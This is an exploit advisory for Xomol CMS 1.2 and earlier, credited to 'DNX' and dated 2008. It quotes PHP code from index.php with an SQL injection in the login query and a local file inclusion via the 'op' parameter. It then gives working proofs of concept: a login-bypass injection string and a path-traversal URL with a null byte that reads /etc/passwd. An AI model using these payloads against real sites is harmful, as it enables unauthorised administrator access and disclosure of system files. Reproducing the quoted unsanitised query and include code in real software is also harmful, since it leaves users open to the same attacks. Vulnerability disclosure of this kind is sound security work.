Xomol CMS <= 1.2 Login Bypass / LFI Vulnerabilities
===================================================



                     \#&#039;#/
                     (-.-)
   -------------oOO---(_)---OOo------------
   |    Xomol CMS v1 Login Bypass & LFI   |
   |             coded by DNX             |
   ----------------------------------------
[!] Discovered.: DNX
[!] Vendor.....: http://www.xomol.net
[!] Detected...: 12.05.2008
[!] Reported...: 13.05.2008 (didn&#039;t work: host mail.xomol.net said: 554 5.7.1 - Relay access denied)
[!] Response...: xx.xx.2008

[!] Background.: Xomol CMS is a content management system based on PHP and MySQL

[!] Bug Bypass.: $_POST[&#039;email&#039;] and $_POST[&#039;password&#039;] in index.php near line 59

                 58: if(!empty($_POST[&#039;email&#039;])&&!empty($_POST[&#039;password&#039;])){
                 59:      $sql=&#039;SELECT user_id FROM users WHERE user_email="&#039;.$_POST[&#039;email&#039;].&#039;"  AND  user_password="&#039;.md5($_POST[&#039;password&#039;]).&#039;" AND user_status=1&#039;;
                 60:      $result = sql_query($sql, $dbi);

[!] Bug LFI....: $op in index.php near line 272

                 234: switch($op){

                 270:     default:
                 271:     if (file_exists(&#039;modules/&#039;.$op.&#039;/index.php&#039;)) {
                 272:         include(&#039;modules/&#039;.$op.&#039;/index.php&#039;);

[!] PoC Bypass.: Login with email: " OR user_group=1/*"" and password: not empty
                 (works only with magic_quotes_gpc = off)

[!] PoC LFI....: http://127.0.0.1/xomol/index.php?op=../../../../../../../../../../etc/passwd%00




